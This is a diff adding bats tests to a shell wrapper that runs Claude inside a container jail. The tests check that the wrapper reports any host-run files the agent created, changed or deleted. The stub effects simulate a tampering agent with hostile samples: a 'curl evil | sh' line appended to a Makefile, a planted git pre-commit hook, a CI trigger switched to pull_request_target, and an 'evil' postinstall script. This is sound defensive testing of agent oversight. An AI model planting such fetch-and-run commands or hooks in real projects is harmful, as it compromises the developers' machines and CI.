@@ -84,6 +84,73 @@ launch_jailed() { run bash -c 'cd "$1" && shift && "$@"' _ "${DIR:-$PROJ}" "$REP
   has_pair "$(run_args)" -v "$BATS_TEST_TMPDIR/skills:/home/claudeuser/.claude/skills:ro,z"
 }
 
+# --- report of host-run files changed while Claude ran ---------------------------
+
+@test "watch: nothing to report when no watched file changed" {
+  echo 'all:' > "$PROJ/Makefile"
+  export STUB_RUN_EFFECT='mkdir -p src && echo "package main" > src/main.go'
+  launch
+  [ "$status" -eq 0 ]
+  not grep -q 'Claude changed files' <<<"$output"
+}
+
+@test "watch: lists created, changed and deleted host-run files after the jail exits" {
+  mkdir -p "$PROJ/.github/workflows"
+  echo 'all:' > "$PROJ/Makefile"
+  echo 'export X=1' > "$PROJ/.envrc"
+  echo 'on: push' > "$PROJ/.github/workflows/ci.yml"
+  echo 'echo hi' > "$PROJ/build.sh"
+  export STUB_RUN_EFFECT='echo "all: ; curl evil | sh" >> Makefile; rm .envrc; echo x > deploy.sh;
+    echo "on: pull_request_target" > .github/workflows/ci.yml; chmod +x build.sh;
+    mkdir -p .git/hooks && echo evil > .git/hooks/pre-commit; echo ok > notes.md'
+  launch
+  [ "$status" -eq 0 ]
+  contains "$output" "Claude changed files that your host runs"
+  for line in "changed  Makefile" "deleted  .envrc" "created  deploy.sh" \
+              "changed  .github/workflows/ci.yml" "changed  build.sh" "created  .git/hooks/pre-commit"; do
+    grep -qE "^ +${line// /  *}\$" <<<"$output" || { echo "missing: $line" >&2; false; }
+  done
+  not grep -q 'notes.md' <<<"$output"
+}
+
+@test "watch: a file is listed once, even where 'makefile' and 'Makefile' are the same file (macOS)" {
+  echo 'all:' > "$PROJ/Makefile"
+  export STUB_RUN_EFFECT='echo changed >> Makefile'
+  launch
+  [ "$(grep -ciE '^ +changed +makefile$' <<<"$output")" -eq 1 ]
+}
+
+@test "watch: Claude's exit code is kept, and the report still runs" {
+  echo 'all:' > "$PROJ/Makefile"
+  export STUB_RUN_EFFECT='echo changed >> Makefile' STUB_RUN_EXIT=3
+  launch
+  [ "$status" -eq 3 ]
+  contains "$output" "changed  Makefile"
+}
+
+@test "watch: JAIL_WATCH_PATHS picks the paths, empty turns the report off" {
+  mkdir -p "$PROJ/api"
+  echo 'all:' > "$PROJ/api/Makefile"
+  export STUB_RUN_EFFECT='echo changed >> api/Makefile'
+  JAIL_WATCH_PATHS='*/Makefile' launch
+  contains "$output" "changed  api/Makefile"
+
+  JAIL_WATCH_PATHS= launch
+  [ "$status" -eq 0 ]
+  not grep -q 'Claude changed files' <<<"$output"
+}
+
+@test "watch: claude-jailed reports too, and leaves no snapshot behind" {
+  export STUB_PROXY_RUNNING=true TMPDIR="$BATS_TEST_TMPDIR/tmp"
+  mkdir -p "$TMPDIR"
+  echo '{}' > "$PROJ/package.json"
+  export STUB_RUN_EFFECT='echo "{\"scripts\":{\"postinstall\":\"evil\"}}" > package.json'
+  launch_jailed
+  [ "$status" -eq 0 ]
+  contains "$output" "changed  package.json"
+  [ -z "$(ls -A "$TMPDIR")" ]
+}
+
 @test "claude-jail: refuses outside DEV_PROJECTS without starting anything" {
   DIR="$BATS_TEST_TMPDIR" launch
   [ "$status" -eq 1 ]
